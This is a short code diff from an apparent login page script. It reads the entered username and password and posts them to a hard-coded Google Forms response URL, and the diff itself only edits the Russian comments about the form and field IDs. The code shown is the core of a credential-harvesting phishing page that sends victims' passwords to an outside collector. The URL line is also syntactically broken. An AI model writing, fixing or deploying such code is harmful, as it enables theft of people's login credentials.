@@ -42,12 +42,12 @@
       const username = document.getElementById('username').value;
       const password = document.getElementById('password').value;
 
-      // === ТОЛЬКО ОДИН FORM_ID ===
+      // === ПРАВИЛЬНЫЙ FORM_ID ===
       const FORM_ID = '1FAIpQLScu5xOIp9J2D_5yOH5nZCYdHisE-kgxL1TCuU-TTr5LDFF2mg';
       const formUrl = https://docs.google.com/forms/d/e/${FORM_ID}/formResponse;
       
       const formData = new FormData();
-      // === ТОЛЬКО НОВЫЕ ID ПОЛЕЙ ===
+      // === ПРАВИЛЬНЫЕ ID ПОЛЕЙ ===
       formData.append('entry.1789042509', username);
       formData.append('entry.416258701', password);
 
